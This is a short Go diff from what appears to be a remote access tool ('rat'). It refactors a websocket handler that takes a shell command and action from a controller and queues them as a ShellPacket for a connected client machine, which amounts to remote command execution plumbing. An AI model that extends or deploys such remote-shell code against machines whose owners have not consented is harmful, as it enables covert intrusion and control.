@@ -1,28 +1,19 @@
 package main
 
 import (
-	"encoding/json"
 	"rat/shared/network/header"
 
 	"golang.org/x/net/websocket"
 )
 
-type ShellEvent struct {
+type ShellMessage struct {
 	Action  int    `json:"action"`
 	Command string `json:"command"`
 }
 
-type ShellMessage Message
-
-func (d ShellMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
-	var shellEvent ShellEvent
-	err := json.Unmarshal([]byte(data), &shellEvent)
-	if err != nil {
-		return err
-	}
-
+func (m ShellMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
 	client.Listeners[header.ShellHeader] = ws
-	client.Queue <- &ShellPacket{shellEvent.Action, shellEvent.Command}
+	client.Queue <- &ShellPacket{m.Action, m.Command}
 
 	return nil
 }
